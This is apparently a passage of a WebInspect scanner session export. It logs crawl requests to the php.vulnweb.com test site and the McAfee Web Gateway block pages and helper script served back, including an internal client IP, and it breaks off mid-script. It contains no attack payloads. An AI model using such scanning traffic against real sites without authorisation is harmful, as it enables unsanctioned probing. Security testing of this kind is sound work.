"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/5.jpg.tn");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:49:09</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Cache-Control</Name><Value>no-cache</Value></Header><Header><Name>Content-Length</Name><Value>3659</Value></Header><Header><Name>X-Frame-Options</Name><Value>deny</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="D3CACCEC1221F8DD2DCCCE3A90190E58"><URL>http://php.vulnweb.com:80/userinfo.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="D3CACCEC1221F8DD2DCCCE3A90190E58"><![CDATA[PATCH /userinfo.php HTTP/1.1
Referer: http://php.vulnweb.com/login.php
Content-Type: application/x-www-form-urlencoded
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
Content-Length: 20
Cookie: CustomCookie=WebInspect0

uname=12345&pass=foo]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 302 Found
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:09 GMT
Server: nginx/1.19.0
Location: login.php
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 14

you must login]]></RawResponse><Request id="D3CACCEC1221F8DD2DCCCE3A90190E58"><Method>PATCH</Method><Path>/</Path><File>userinfo</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>uname=12345&amp;pass=foo</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/login.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>Content-Length</Name><Value>20</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>302</StatusCode><StatusDescription>Found</StatusDescription><SetCookie /><ResponseBody><![CDATA[you must login]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:09 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Location</Name><Value>login.php</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>14</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="B243388C9703B3AF7BBED58625FAA89F"><URL>http://php.vulnweb.com:80/mwg-internal/de5fs23hu73ds/files/javascript/sw.js</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="B243388C9703B3AF7BBED58625FAA89F"><![CDATA[GET /mwg-internal/de5fs23hu73ds/files/javascript/sw.js HTTP/1.1
Referer: http://php.vulnweb.com/pictures/1.jpg.tn
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="B243388C9703B3AF7BBED58625FAA89F";PSID="210657288A91100C4123A79F42F2ACAF";SessionType="Crawl";CrawlType="ScriptInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="83";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="c3eb4cbb";
X-Request-Memo: ID="95772e57";sc="1";tid="83";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.0 200 OK
Via: 1.0 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: application/x-javascript
Cache-Control: Max-age=86400
Content-Length: 13629

function swOnLoad() {
	if (document.getElementById('progresspage') != null) {
		resizeWindow();
		if (document.getElementById('progresspagedone') == null) {
			makeRequest();
		}
	}
}

function swOnClick() {
	if (document.getElementById('continuesession') != null) {
		resizeWindow();
		if (document.getElementById('progresspagedone') == null) {
			makeRequest();
		}
	}
}

function js_encode (lineToEncode) {
	var t = lineToEncode.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
	return t;
}

function writeToDocument (stringToWrite) {
	if (stringToWrite != '') {
		document.write(stringToWrite);
	}
}

function computeLastQuotaURL (url, urlprefix) {
	if (url.indexOf(urlprefix) >= 0) {
		var pos = url.indexOf("url=") + 4;
		url = url.substring(pos);
		url = decodeURIComponent(url);
	}
	break_line(url);
}

function utf8Encode(string) {
		string = string.replace(/\r\n/g,"\n");
		var utftext = "";
 
		for (var n = 0; n < string.length; n++) {
 
			var c = string.charCodeAt(n);
 
			if (c < 128) {
				utftext += String.fromCharCode(c);
			}
			else if((c > 127) && (c < 2048)) {
				utftext += String.fromCharCode((c >> 6) | 192);
				utftext += String.fromCharCode((c & 63) | 128);
			}
			else {
				utftext += String.fromCharCode((c >> 12) | 224);
				utftext += String.fromCharCode(((c >> 6) & 63) | 128);
				utftext += String.fromCharCode((c & 63) | 128);
			}
 
		}
 
		return utftext;
	}


function encodeUTF8Base64 (inputStr) {
	var charsForEncoding = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
	var encodedString = '';
	var byte1, byte2, byte3;
	var encByte1, encByte2, encByte3, encByte4;
	var i = 0;
	
	inputStr = utf8Encode(inputStr);


	do {
		byte1 = inputStr.charCodeAt(i);
		++i;
		byte2 = inputStr.charCodeAt(i);
		++i;
		byte3 = inputStr.charCodeAt(i);
		++i;
		
		encByte1 = byte1 >> 2;
		encByte2 = ((byte1 & 3) << 4) | (byte2 >> 4);
		encByte3 = ((byte2 & 15) << 2) | (byte3 >> 6);
		encByte4 = byte3 & 63;
		
		if (isNaN(byte3)) {
			encByte4 = 64;
			if (isNaN(byte2)) {
				encByte3 = 64;
			}
		}
		encodedString += charsForEncoding.charAt(encByte1) + charsForEncoding.charAt(encByte2) + charsForEncoding.charAt(encByte3) + charsForEncoding.charAt(encByte4);
	} while (i < inputStr.length);
	return encodedString;
}

var pluginRequest;

function getRequestObject()
{
	var pluginRequest;
	if (typeof XMLHttpRequest != 'undefined') {
		pluginRequest = new XMLHttpRequest();
	}
	if (!pluginRequest) {
		try {
			pluginRequest = new ActiveXObject("Msxml2.XMLHTTP");
		} catch(e) {
			try {
				pluginRequest = new ActiveXObject("Microsoft.XMLHTTP");
			} catch(e) {
				pluginRequest = null;
			}
		}
	}

	return (pluginRequest);
};

function activateSession(url,user,oldurl) {
	var userNameAO = document.getElementById('username');
	var pwAO = document.getElementById('password');
	var slAO = document.getElementById('sessionlength');
	var activateButton = document.getElementById('activatebutton');
	var hasLoginAndPW = false;
	activateButton.disabled = true;
	if ( (userNameAO != null) && (pwAO != null) && (slAO != null) ) {
		if ( (userNameAO.value == "") || (pwAO.value == "") || (slAO.value == "")) {
			alert ("Please insert your login, password and session length!");
			activateButton.disabled = false;
			return;
		}
		hasLoginAndPW = true;
	}
	if (typeof XMLHttpRequest != 'undefined') {
		pluginRequest = new XMLHttpRequest();
	}
	if (!pluginRequest) {
		try {
			pluginRequest = new ActiveXObject("Msxml2.XMLHTTP");
		} catch(e) {
			try {
				pluginRequest = new ActiveXObject("Microsoft.XMLHTTP");
			} catch(e) {
				pluginRequest = null;
			}
		}
	}
	
	//encode data and set header 'Quota-Data'
	var quotaDataStr = "";
	if (user != "" ) {
		var pos = user.indexOf("&apos;");
		while (pos >= 0) {
			user = user.replace(/&apos;/g, "'");
			pos = user.indexOf("&apos;");
		}
		quotaDataStr = encodeUTF8Base64(user);
	}
	if (hasLoginAndPW) {
		quotaDataStr = quotaDataStr + "+1AB2+" + encodeUTF8Base64(userNameAO.value) + "+2CD3+" + encodeUTF8Base64(pwAO.value) + "+3EF4+" + encodeUTF8Base64(slAO.value);
	}
	if (quotaDataStr != "")
		quotaDataStr = encodeUTF8Base64( quotaDataStr );
	
	if (pluginRequest) {
		pluginRequest.open("POST", url, true);
		
		pluginRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		pluginRequest.setRequestHeader("Content-length", 0);
		pluginRequest.setRequestHeader("Quota-Data", quotaDataStr);
		pluginRequest.setRequestHeader("Quota-URL", oldurl);
		pluginRequest.onreadystatechange = function () {
			if (pluginRequest.readyState == 4) {
				var paramIndex = location.pathname.indexOf("/IfpRedirect");
				if (pluginRequest.status == 403 || paramIndex >= 0) {
					if(pluginRequest.status == 403 )
						document.getElementsByTagName("body")[0].innerHTML = pluginRequest.responseText;
					if(paramIndex >= 0) {
				 		myurl =  pluginRequest.getResponseHeader("Quota-RedirectURL");
       	         		location.replace(myurl);
					}
				} else {
					location.reload(true);
				}
			} else {
				setTimeout(abortPluginRequest, 4000);
			}
    		};
		pluginRequest.send('');
	}
	activateButton.disabled = false;
}

function activateSessionWithSSL(enduserurl,user,oldurl) {
	var userNameAO = document.getElementById('username');
	var pwAO = document.getElementById('password');
	var slAO = document.getElementById('sessionlength');
	var activateButton = document.getElementById('activatebutton');
	var hasLoginAndPW = false;
	activateButton.disabled = true;
	if ( (userNameAO != null) && (pwAO != null) && (slAO != null) ) {
		if ( (userNameAO.value == "") || (pwAO.value == "") || (slAO.value == "")) {
			alert ("Please insert your login, password and session length!");
			activateButton.disabled = false;
			return;
		}
		hasLoginAndPW = true;
	}
	//encode data and set header 'Quota-Data'
	var quotaDataStr = "";
	if (user != "" ) {
		var pos = user.indexOf("&apos;");
		while (pos >= 0) {
			user = user.replace(/&apos;/g, "'");
			pos = user.indexOf("&apos;");
		}
		quotaDataStr = encodeUTF8Base64(user);
	}
	if (hasLoginAndPW) {
		quotaDataStr = quotaDataStr + "+1AB2+" + encodeUTF8Base64(userNameAO.value) + "+2CD3+" + encodeUTF8Base64(pwAO.value) + "+3EF4+" + encodeUTF8Base64(slAO.value);
	}
	if (quotaDataStr != "")
		quotaDataStr = encodeUTF8Base64( quotaDataStr );
		
	var u = "https://www.authserver.xxx" + enduserurl + "&Quota-Data=" + quotaDataStr + "&Quota-URL=" + oldurl;

	location.href=u;
	
	activateButton.disabled = false;
}

function requestOTP()
{
	document.getElementById ("getOTP").disabled = true;
	pluginRequest = getRequestObject();
	pluginRequest.open ("GET", decodeURIComponent (location.href), true);
	pluginRequest.setRequestHeader ("RequestOTP", "yes");
	pluginRequest.onreadystatechange = function () {
		if (pluginRequest.readyState == 4) {
			document.getElementById ("getOTP").disabled = false;
			var context = pluginRequest.getResponseHeader ("OTPContext");
			if (context) {	
				document.getElementById ("password").disabled = false;
				document.getElementById ("activatebutton").disabled = false;
				document.getElementById ("username").value = context;
			} else { 	
				document.getElementsByTagName("body")[0].innerHTML = pluginRequest.responseText;
			}
		} else {
			setTimeout (abortPluginRequest, 10000);
		}
    };
	pluginRequest.send('');
};

function abortPluginRequest (url, withNewRequest) {
	if (! pluginRequest) {
		alert ("No plugin request");
		return;
	}
        if (pluginRequest.readyState != 4) {
		pluginRequest.abort();
	}
}

function break_line(lineToBreak) {
	if (lineToBreak != '') {
		var len = lineToBreak.length;
		var splitStr = '<wbr />';
		for (var i = 0; i < len;) {
			lineToBreak = lineToBreak.substring(0,i) + splitStr + lineToBreak.substring(i);
			i += 20 + splitStr.length;
			len += splitStr.length;
		}
		lineToBreak = js_encode (lineToBreak);
		lineToBreak = lineToBreak.replace (/&lt;wbr \/&gt;/g, '<wbr />');
		document.write(lineToBreak);
	}
}

function resizeWindow() {
	var x,y;
	if (self.innerHeight) { // all except Explorer
		x = self.innerWidth;
		y = self.innerHeight;
	} else if (document.documentElement && document.documentElement.clientHeight) {
		// Explorer 6 Strict Mode
		x = document.documentElement.clientWidth;
		y = document.documentElement.clientHeight;
	} else if (document.body) {
		// other Explorers
		x = document.body.clientWidth;
		y = document.body.clientHeight;
	}
	if (x < 700 || y < 500) {
		window.resizeTo (700,500);
	}
}

var httpRequest;
var firstRun = 1;

function fixNonHttpURL(paramURL) {
	var url = paramURL;
	var forceRedirect = false;
	if (url.substring(0, 4) !== "http" || url.indexOf("/mwg-internal/") < 0) {
		// Side step Cross-Site protection by client-side redirect to change protocol
		url = document.forms[0].action;
		if (url.substring(0, 4) === "ftp:" || url.substring(0,2) === "//") {
			// replace //domain.com and ftp://domain.com, but not file://folder
			url = url.replace(/^(ftp:)?\/\//g, 'http://');
			console.log("MWG-Progress-Page correcting URL from "+document.location+" to form-action URL "+document.forms[0].action+" with http: "+url);
		} else {
			console.log("MWG-Progress-Page correcting URL from "+document.location+" to form-action: "+url);
		}
		forceRedirect = true;
	}
	return { forceRedirect: forceRedirect, url: url };
};

function makeRequest() {
	if (typeof XMLHttpRequest != 'undefined') {
		window.httpRequest = new XMLHttpRequest();
	}
	if (!window.httpRequest) {
		try {
			window.httpRequest  = new ActiveXObject("Msxml2.XMLHTTP");
		} catch(e) {
			try {
				window.httpRequest  = new ActiveXObject("Microsoft.XMLHTTP");
			} catch(e) {
				window.httpRequest  = null;
			}
		}
	}
	if (window.httpRequest) {
		var correctURL = fixNonHttpURL(document.location + "");
		var url = correctURL.url;
		var forceRedirect = correctURL.forceRedirect;

		// remove querystring
		if (url.indexOf ("?") >=0) {
			url = url.substr (0, url.indexOf ("?"));
		}
		if (forceRedirect) {
			url = url + "?id=" + document.getElementById("progresspageid").content;
			window.location = url;
			return;
		}
		url = url + "?id=" + document.getElementById("progresspageid").content + "&a=1&" + (new Date()).getTime();
		console.log("MWG-Progress-Request URL: "+ url);
		window.httpRequest.open("GET", url, true);
		window.httpRequest.onreadystatechange = getResponse; // Callback Function
		window.httpRequest.send('');
	}
}

var progressBarCount = 20;
var progressBarImageWidth = 15;
var progressBarImageHeight = 20;
var progressBarImageBlue = new Image();
var progressBarImageGrey = new Image();
var timerId = null;

function getResponse()
{
	if (window.httpRequest.readyState == 4 && window.httpRequest.status == 200) {
		var resRaw = window.httpRequest.responseText;
		/** Need 4-values separated by ";": downloaded_size ; download_total_size|? ; progess_in_100_percent|40 for unknown size ; 0|1=download_ready ; 0=not_scanning|scantime_in_secs */
		if (window.httpRequest.responseText.length >= 500 || !resRaw.match(/[^;]{0,20};[^;]{0,20};[01];[^;]{0,100}/)) {
			var error = 'Unexpected progress page result (too large?). Stopping to check for "FTP download over HTTP"-progress. See browser console for details.';
			console.log("MWG-Progress page query-failed:\nURL: "+window.httpRequest.responseURL+"\nResponse headers:\n" + window.httpRequest.getAllResponseHeaders() + "\n\nContent:\n" + window.httpRequest.responseText);
			alert(error);
			if (timerId!=null) {
				try {
					window.clearInterval(timerId);
				} catch (ex) {
				}
			}
			throw error;
		}
		var res = resRaw.split(";");
		if (res[3] == 1 || res[3] == undefined) { 
			var correctURL = fixNonHttpURL(document.location + "");
			var url = correctURL.url;
			var forceRedirect = correctURL.forceRedirect;
			if (forceRedirect) {
				window.location = url;
			} else {
				console.log("MWG-Progress-Reload: " + url);
				window.location.reload();
			}
		}
		var text = "";
		if( res[4] == 0) {
			var temp = document.getElementById ('downloadText');
			if (temp) {
				text = temp.content;
				text = text.replace (/[|]a/g, res[0]);
				text = text.replace (/[|]b/g, res[1]);
			} else {
				text = "Downloaded " + res[0] + " of " + res[1];
			}
		} else {
			var temp = document.getElementById ('scanningText');
			if (temp) {
				text = temp.content;
				text = text.replace (/[|]a/g,res[4]);
			} else {
				text = "Scanning in progress (" + res[4] + "s)";
			}
		}
		document.getElementById ("progress").firstChild.nodeValue = text;

		for (i=0; i<progressBarCount; i++) {
			var img = document.getElementById (("i" + i));
			if (img != null) {
				if ((res[4] == 0 && res[2] >= (i * 100 / progressBarCount))
					|| (res[4] > 0 && i == Math.round(res[4]/3) % progressBarCount) )
					img.src = window.progressBarImageBlue.src;
				else
					img.src = window.progressBarImageGrey.src;
				img.width = window.progressBarImageWidth;
				img.height = window.progressBarImageHeight;
			}
		}
		var timeElem = document.getElementById ("time");
		if (timeElem) {
			var now = new Date();
			timeElem.firstChild.nodeValue = now;
		}
		if (window.firstRun == 1 ) { timerId = window.setInterval("makeRequest()", 3000); window.firstRun = 0;}
	}
}

function printProgressBar(imgCount,imgDone,img,width,height)
{
	window.progressBarCount = imgCount;
	window.progressBarImageWidth = width;
	window.progressBarImageHeight = height;
	window.progressBarImageBlue.src = imgDone;
	window.progressBarImageGrey.src = img;
	
	for (i=0; i<imgCount; i++) {
		document.write ('<img id ="i' + i + '" src="' + img + '" height="' + height + '" width="' + width + '">\n');
	}		
}
]]></RawResponse><Request id="B243388C9703B3AF7BBED58625FAA89F"><Method>GET</Method><Path>/mwg-internal/de5fs23hu73ds/files/javascript/</Path><File>sw</File><Ext>js</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/1.jpg.tn</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="B243388C9703B3AF7BBED58625FAA89F";PSID="210657288A91100C4123A79F42F2ACAF";SessionType="Crawl";CrawlType="ScriptInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="83";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="c3eb4cbb";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="95772e57";sc="1";tid="83";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.0</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[function swOnLoad() {
	if (document.getElementById('progresspage') != null) {
		resizeWindow();
		if (document.getElementById('progresspagedone') == null) {
			makeRequest();
		}
	}
}

function swOnClick() {
	if (document.getElementById('continuesession') != null) {
		resizeWindow();
		if (document.getElementById('progresspagedone') == null) {
			makeRequest();
		}
	}
}

function js_encode (lineToEncode) {
	var t = lineToEncode.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
	return t;
}

function writeToDocument (stringToWrite) {
	if (stringToWrite != '') {
		document.write(stringToWrite);
	}
}

function computeLastQuotaURL (url, urlprefix) {
	if (url.indexOf(urlprefix) >= 0) {
		var pos = url.indexOf("url=") + 4;
		url = url.substring(pos);
		url = decodeURIComponent(url);
	}
	break_line(url);
}

function utf8Encode(string) {
		string = string.replace(/\r\n/g,"\n");
		var utftext = "";
 
		for (var n = 0; n < string.length; n++) {
 
			var c = string.charCodeAt(n);
 
			if (c < 128) {
				utftext += String.fromCharCode(c);
			}
			else if((c > 127) && (c < 2048)) {
				utftext += String.fromCharCode((c >> 6) | 192);
				utftext += String.fromCharCode((c & 63) | 128);
			}
			else {
				utftext += String.fromCharCode((c >> 12) | 224);
				utftext += String.fromCharCode(((c >> 6) & 63) | 128);
				utftext += String.fromCharCode((c & 63) | 128);
			}
 
		}
 
		return utftext;
	}


function encodeUTF8Base64 (inputStr) {
	var charsForEncoding = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
	var encodedString = '';
	var byte1, byte2, byte3;
	var encByte1, encByte2, encByte3, encByte4;
	var i = 0;
	
	inputStr = utf8Encode(inputStr);


	do {
		byte1 = inputStr.charCodeAt(i);
		++i;
		byte2 = inputStr.charCodeAt(i);
		++i;
		byte3 = inputStr.charCodeAt(i);
		++i;
		
		encByte1 = byte1 >> 2;
		encByte2 = ((byte1 & 3) << 4) | (byte2 >> 4);
		encByte3 = ((byte2 & 15) << 2) | (byte3 >> 6);
		encByte4 = byte3 & 63;
		
		if (isNaN(byte3)) {
			encByte4 = 64;
			if (isNaN(byte2)) {
				encByte3 = 64;
			}
		}
		encodedString += charsForEncoding.charAt(encByte1) + charsForEncoding.charAt(encByte2) + charsForEncoding.charAt(encByte3) + charsForEncoding.charAt(encByte4);
	} while (i < inputStr.length);
	return encodedString;
}

var pluginRequest;

function getRequestObject()
{
	var pluginRequest;
	if (typeof XMLHttpRequest != 'undefined') {
		pluginRequest = new XMLHttpRequest();
	}
	if (!pluginRequest) {
		try {
			pluginRequest = new ActiveXObject("Msxml2.XMLHTTP");
		} catch(e) {
			try {
				pluginRequest = new ActiveXObject("Microsoft.XMLHTTP");
			} catch(e) {
				pluginRequest = null;
			}
		}
	}

	return (pluginRequest);
};

function activateSession(url,user,oldurl) {
	var userNameAO = document.getElementById('username');
	var pwAO = document.getElementById('password');
	var slAO = document.getElementById('sessionlength');
	var activateButton = document.getElementById('activatebutton');
	var hasLoginAndPW = false;
	activateButton.disabled = true;
	if ( (userNameAO != null) && (pwAO != null) && (slAO != null) ) {
		if ( (userNameAO.value == "") || (pwAO.value == "") || (slAO.value == "")) {
			alert ("Please insert your login, password and session length!");
			activateButton.disabled = false;
			return;
		}
		hasLoginAndPW = true;
	}
	if (typeof XMLHttpRequest != 'undefined') {
		pluginRequest = new XMLHttpRequest();
	}
	if (!pluginRequest) {
		try {
			pluginRequest = new ActiveXObject("Msxml2.XMLHTTP");
		} catch(e) {
			try {
				pluginRequest = new ActiveXObject("Microsoft.XMLHTTP");
			} catch(e) {
				pluginRequest = null;
			}
		}
	}
	
	//encode data and set header 'Quota-Data'
	var quotaDataStr = "";
	if (user != "" ) {
		var pos = user.indexOf("&apos;");
		while (pos >= 0) {
			user = user.replace(/&apos;/g, "'");
			pos = user.indexOf("&apos;");
		}
		quotaDataStr = encodeUTF8Base64(user);
	}
	if (hasLoginAndPW) {
		quotaDataStr = quotaDataStr + "+1AB2+" + encodeUTF8Base64(userNameAO.value) + "+2CD3+" + encodeUTF8Base64(pwAO.value) + "+3EF4+" + encodeUTF8Base64(slAO.value);
	}
	if (quotaDataStr != "")
		quotaDataStr = encodeUTF8Base64( quotaDataStr );
	
	if (pluginRequest) {
		pluginRequest.open("POST", url, true);
		
		pluginRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		pluginRequest.setRequestHeader("Content-length", 0);
		pluginRequest.setRequestHeader("Quota-Data", quotaDataStr);
		pluginRequest.setRequestHeader("Quota-URL", oldurl);
		pluginRequest.onreadystatechange = function () {
			if (pluginRequest.readyState == 4) {
				var paramIndex = location.pathname.indexOf("/IfpRedirect");
				if (pluginRequest.status == 403 || paramIndex >= 0) {
					if(pluginRequest.status == 403 )
						document.getElementsByTagName("body")[0].innerHTML = pluginRequest.responseText;
					if(paramIndex >= 0) {
				 		myurl =  pluginRequest.getResponseHeader("Quota-RedirectURL");
       	         		location.replace(myurl);
					}
				} else {
					location.reload(true);
				}
			} else {
				setTimeout(abortPluginRequest, 4000);
			}
    		};
		pluginRequest.send('');
	}
	activateButton.disabled = false;
}

function activateSessionWithSSL(enduserurl,user,oldurl) {
	var userNameAO = document.getElementById('username');
	var pwAO = document.getElementById('password');
	var slAO = document.getElementById('sessionlength');
	var activateButton = document.getElementById('activatebutton');
	var hasLoginAndPW = false;
	activateButton.disabled = true;
	if ( (userNameAO != null) && (pwAO != null) && (slAO != null) ) {
		if ( (userNameAO.value == "") || (pwAO.value == "") || (slAO.value == "")) {
			alert ("Please insert your login, password and session length!");
			activateButton.disabled = false;
			return;
		}
		hasLoginAndPW = true;
	}
	//encode data and set header 'Quota-Data'
	var quotaDataStr = "";
	if (user != "" ) {
		var pos = user.indexOf("&apos;");
		while (pos >= 0) {
			user = user.replace(/&apos;/g, "'");
			pos = user.indexOf("&apos;");
		}
		quotaDataStr = encodeUTF8Base64(user);
	}
	if (hasLoginAndPW) {
		quotaDataStr = quotaDataStr + "+1AB2+" + encodeUTF8Base64(userNameAO.value) + "+2CD3+" + encodeUTF8Base64(pwAO.value) + "+3EF4+" + encodeUTF8Base64(slAO.value);
	}
	if (quotaDataStr != "")
		quotaDataStr = encodeUTF8Base64( quotaDataStr );
		
	var u = "https://www.authserver.xxx" + enduserurl + "&Quota-Data=" + quotaDataStr + "&Quota-URL=" + oldurl;

	location.href=u;
	
	activateButton.disabled = false;
}

function requestOTP()
{
	document.getElementById ("getOTP").disabled = true;
	pluginRequest = getRequestObject();
